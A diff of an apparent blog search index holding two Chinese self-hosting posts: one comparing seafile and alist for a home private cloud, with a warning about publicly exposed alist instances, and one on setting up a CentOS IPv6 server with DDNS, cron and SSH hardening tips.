+<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong><br>
+<img src="ab1a82c6bfabc1191ebdb4b0574351e2.jpeg" alt="ab1a82c6bfabc1191ebdb4b0574351e2.jpeg"></p>
+<h3 id="seafile">seafile</h3>
+<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
+<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
+<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
+<p>优点：</p>
+<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
+<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
+<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
+<p>缺点：</p>
+<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
+<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
+<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
+<p><img src="3332e0ca17ddc316dff9dfce8e855a7b.png" alt="3332e0ca17ddc316dff9dfce8e855a7b.png"></p>
+<h3 id="alist">alist</h3>
+<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
+<p>alist的部署更加简单，具体可以看这位博主的文章</p>
+<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
+<p>同样讲一下alist的优缺点</p>
+<p>优点：</p>
+<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
+<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
+<p>缺点：</p>
+<p>​    1.没有客户端工具只能通过网页端访问资源</p>
+<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
+<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
+<p>​    4.有点“重”，内容多的话要加载很久</p>
+<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
+<h3 id="alist的安全问题">alist的安全问题</h3>
+<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
+<p><img src="d084b60e129e0b01c6c9ff098f0ef590.png" alt="d084b60e129e0b01c6c9ff098f0ef590.png"></p>
+<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
+<p><img src="5fb6ece552d92978ae906da09115795a.png" alt="5fb6ece552d92978ae906da09115795a.png"></p>
+<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
+<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
+<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
+<p>同时也可以参考下面这位up主的视频</p>
+<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
+<h3 id="最后">最后</h3>
+<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>alist</tag>
+        <tag>seafile</tag>
       </tags>
   </entry>
   <entry>
@@ -1518,6 +1518,77 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>利用ipv6搭建一台服务器</title>
+    <url>/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器</p>
+<h3 id="硬件需求">硬件需求</h3>
+<p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p>
+<p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p>
+<p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="准备工作">准备工作</h3>
+<p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p>
+<p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p>
+<p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>下载balenaetcher将iso文件烧录至U盘中</p>
+<p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p>
+<p>可以以这个up主的视频作为参考</p>
+<p><a href="https://b23.tv/LeqXDBR">（上）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a><br>
+<a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p>
+<h3 id="安装系统">安装系统</h3>
+<p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p>
+<p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p>
+<p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p>
+<p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p>
+<h3 id="配置网络">配置网络</h3>
+<p>系统安装完成以后就要开始配置网络了，我采取的方法是在局域网内使用固定的ipv4地址，同时开启centos的ipv6地址</p>
+<p>首先使用ifconfig查看网卡名字和分配的ip地址，如果已经有ipv6和ipv4地址了就不用管了，如果没有就需要对网卡配置文件进行修改</p>
+<p>使用以下命令对网卡配置进行修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-网卡名字 <span class="comment">#打开网卡配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有ipv6则加上这么几句话</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启网卡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>弄好以后可以用外网ping一下看分配到的ipv6地址是否能够ping通</p>
+<p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p>
+<h3 id="获取域名">获取域名</h3>
+<p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p>
+<p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>记录类型选择<strong>AAAA表示ipv6地址</strong></p>
+<p>主机记录填写<strong>子域名名称</strong></p>
+<p>记录值填<strong>对应的ipv6地址</strong></p>
+<p>添加完后进行<strong>生效检测</strong>查看是否能够成功解析</p>
+<p><strong>DDNS</strong></p>
+<p>DDNS（Dynamic Domain Name Server，动态域名服务）是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p>
+<p>网上有很多如何使用DDNS的教程，这里我使用的是是一个大佬分享的python脚本（服务器要安装pyhton运行环境，可以直接下载一个宝塔，会自动安装pyhton3.6）</p>
+<p><a href="https://github.com/zeruns/-Python-aliddns_ipv4-ipv6">zeruns/-Python-aliddns_ipv4-ipv6: 阿里云域名ddns动态域名解析Python源码 (github.com)</a></p>
+<p>使用教程：<a href="https://blog.zeruns.tech/archives/507.html">Python实现阿里云域名DDNS支持ipv4和ipv6 - Zeruns’s Blog</a></p>
+<p>（可以先把自己在阿里云上的ipv6地址改成错误的，然后运行一次程序查看ipv6地址是否被修改回来了）</p>
+<p>接着通过linux中的crontab设置定时任务运行python脚本（我的这里似乎不能直接运行python，需要将用shell脚本运行python然后再用在crontab中定时shell脚本）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#ddns.sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/xxx  <span class="comment"># 写你自己py文件的文件夹</span></span><br><span class="line">/usr/bin/python3.6 aliddns.py &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>添加定时任务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">0 */4 * * * /home/xxx/ddns.sh  <span class="comment">#这里要输入shell脚本的绝对位置</span></span><br><span class="line"><span class="comment">#我是设置的每4个小时运行一次脚本，大家可以根据自己的情况选择脚本的运行时间</span></span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>这样ipv6地址就和域名绑定起来了</p>
+<p>到此为止基本的搭建任务就结束了</p>
+<h3 id="一些不得不提的安全问题">一些不得不提的安全问题</h3>
+<p>我们一般访问自己的linux服务器都是通过ssh的方式访问的，而将ssh服务直接暴露出来会存在一定的安全风险，所以我们最好做一些安全措施来保护我们的服务器不被他人入侵</p>
+<p>1.使用密钥登录ssh而非使用密码登录，防止被他人暴力破解</p>
+<p>2.修改ssh服务的默认端口，ssh的默认端口是22，而网上很多端口扫描的工具都会将22端口作为端口进行扫描</p>
+<p>3.取消root登录</p>
+<p>4.使用knockd来隐藏端口（终极隐藏大法）</p>
+<p><a href="https://cloud.tencent.com/developer/article/1005328">knockd：CVM云主机的隐形斗篷 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>虽然这些操作很复杂，但我想告诉你网络安全真的很重要！！！</p>
+<p>（我的一个朋友之前就因为ssh密码被爆破而被入侵了……）</p>
+]]></content>
+      <categories>
+        <category>经历</category>
+      </categories>
+      <tags>
+        <tag>ipv6</tag>
+        <tag>服务器</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>初识JAVA内存马</title>
     <url>/post/%E5%88%9D%E8%AF%86JAVA%E5%86%85%E5%AD%98%E9%A9%AC/</url>
     <content><![CDATA[<h1 id="介绍">介绍</h1>
@@ -1667,77 +1738,6 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>内存马</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用ipv6搭建一台服务器</title>
-    <url>/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器</p>
-<h3 id="硬件需求">硬件需求</h3>
-<p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p>
-<p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p>
-<p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="准备工作">准备工作</h3>
-<p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p>
-<p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p>
-<p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>下载balenaetcher将iso文件烧录至U盘中</p>
-<p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p>
-<p>可以以这个up主的视频作为参考</p>
-<p><a href="https://b23.tv/LeqXDBR">（上）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a><br>
-<a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p>
-<h3 id="安装系统">安装系统</h3>
-<p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p>
-<p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p>
-<p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p>
-<p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p>
-<h3 id="配置网络">配置网络</h3>
-<p>系统安装完成以后就要开始配置网络了，我采取的方法是在局域网内使用固定的ipv4地址，同时开启centos的ipv6地址</p>
-<p>首先使用ifconfig查看网卡名字和分配的ip地址，如果已经有ipv6和ipv4地址了就不用管了，如果没有就需要对网卡配置文件进行修改</p>
-<p>使用以下命令对网卡配置进行修改</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-网卡名字 <span class="comment">#打开网卡配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有ipv6则加上这么几句话</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启网卡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>弄好以后可以用外网ping一下看分配到的ipv6地址是否能够ping通</p>
-<p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p>
-<h3 id="获取域名">获取域名</h3>
-<p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p>
-<p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>记录类型选择<strong>AAAA表示ipv6地址</strong></p>
-<p>主机记录填写<strong>子域名名称</strong></p>
-<p>记录值填<strong>对应的ipv6地址</strong></p>
-<p>添加完后进行<strong>生效检测</strong>查看是否能够成功解析</p>
-<p><strong>DDNS</strong></p>
-<p>DDNS（Dynamic Domain Name Server，动态域名服务）是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p>
-<p>网上有很多如何使用DDNS的教程，这里我使用的是是一个大佬分享的python脚本（服务器要安装pyhton运行环境，可以直接下载一个宝塔，会自动安装pyhton3.6）</p>
-<p><a href="https://github.com/zeruns/-Python-aliddns_ipv4-ipv6">zeruns/-Python-aliddns_ipv4-ipv6: 阿里云域名ddns动态域名解析Python源码 (github.com)</a></p>
-<p>使用教程：<a href="https://blog.zeruns.tech/archives/507.html">Python实现阿里云域名DDNS支持ipv4和ipv6 - Zeruns’s Blog</a></p>
-<p>（可以先把自己在阿里云上的ipv6地址改成错误的，然后运行一次程序查看ipv6地址是否被修改回来了）</p>
-<p>接着通过linux中的crontab设置定时任务运行python脚本（我的这里似乎不能直接运行python，需要将用shell脚本运行python然后再用在crontab中定时shell脚本）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#ddns.sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/xxx  <span class="comment"># 写你自己py文件的文件夹</span></span><br><span class="line">/usr/bin/python3.6 aliddns.py &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>添加定时任务</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">0 */4 * * * /home/xxx/ddns.sh  <span class="comment">#这里要输入shell脚本的绝对位置</span></span><br><span class="line"><span class="comment">#我是设置的每4个小时运行一次脚本，大家可以根据自己的情况选择脚本的运行时间</span></span><br></pre></td></tr></table></figure>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>这样ipv6地址就和域名绑定起来了</p>
-<p>到此为止基本的搭建任务就结束了</p>
-<h3 id="一些不得不提的安全问题">一些不得不提的安全问题</h3>
-<p>我们一般访问自己的linux服务器都是通过ssh的方式访问的，而将ssh服务直接暴露出来会存在一定的安全风险，所以我们最好做一些安全措施来保护我们的服务器不被他人入侵</p>
-<p>1.使用密钥登录ssh而非使用密码登录，防止被他人暴力破解</p>
-<p>2.修改ssh服务的默认端口，ssh的默认端口是22，而网上很多端口扫描的工具都会将22端口作为端口进行扫描</p>
-<p>3.取消root登录</p>
-<p>4.使用knockd来隐藏端口（终极隐藏大法）</p>
-<p><a href="https://cloud.tencent.com/developer/article/1005328">knockd：CVM云主机的隐形斗篷 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
-<p>虽然这些操作很复杂，但我想告诉你网络安全真的很重要！！！</p>
-<p>（我的一个朋友之前就因为ssh密码被爆破而被入侵了……）</p>
-]]></content>
-      <categories>
-        <category>经历</category>
-      </categories>
-      <tags>
-        <tag>ipv6</tag>
-        <tag>服务器</tag>
       </tags>
   </entry>
   <entry>
